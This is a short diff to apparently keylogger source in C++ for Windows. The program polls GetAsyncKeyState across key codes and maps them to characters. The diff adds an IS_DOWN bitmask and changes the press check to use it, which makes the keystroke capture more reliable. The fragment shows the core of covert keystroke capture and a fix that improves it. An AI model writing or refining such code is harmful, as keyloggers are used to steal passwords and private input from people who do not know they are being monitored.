@@ -2,6 +2,10 @@
 #include<Windows.h> //windows API
 #include<fstream> //std::fstream
 
+#ifndef IS_DOWN
+#define IS_DOWN 0x8000
+#endif
+
 using namespace std;
 
 string getKeySign(char key){
@@ -53,7 +57,7 @@ int main(){
     //cycle through all int key codes
     Sleep(10);
     for(key = 8; key <= 190; key++){
-      if(GetAsyncKeyState(key) == -32767){
+      if(GetAsyncKeyState(key) & IS_DOWN){
         string s = getKeySign(key);
         if(s==""){
           char mappedChar = MapVirtualKey(key,MAPVK_VK_TO_CHAR);
